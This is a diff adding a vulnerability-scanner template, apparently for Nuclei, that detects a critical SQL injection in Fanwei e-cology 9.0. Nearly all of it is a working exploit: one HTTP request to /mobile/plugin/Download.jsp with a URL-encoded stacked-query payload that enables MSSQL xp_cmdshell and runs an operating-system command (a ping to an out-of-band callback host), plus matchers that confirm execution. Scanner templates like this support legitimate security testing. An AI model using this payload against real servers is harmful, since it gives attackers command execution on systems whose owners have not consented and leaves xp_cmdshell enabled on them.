@@ -1,0 +1,26 @@
+id: e-cology-9-sql-injection
+info:
+  name: E-cology 9.0 SQL Injection Leading To Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Fanwei e-cology 9.0 contains a SQL injection vulnerability that allows attackers to execute arbitrary SQL commands, potentially leading to command execution and server compromise.
+  tags: sql-injection, rce
+http:
+  - raw:
+      - |
+        GET /mobile/plugin/Download.jsp?sessionkey=1%27%20EXEC%20sp_configure%20%27show%20advanced%20options%27,1%20RECONFIGURE%20EXEC%20sp_configure%20%27xp_cmdshell%27,1%20RECONFIGURE%20exec%20master..xp_cmdshell%20%27ping%20{{interactsh-url}}%27 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: body
+        regex:
+          - "command completed successfully"
+variables:
+  interactsh-url: "{{interactsh-url}}"
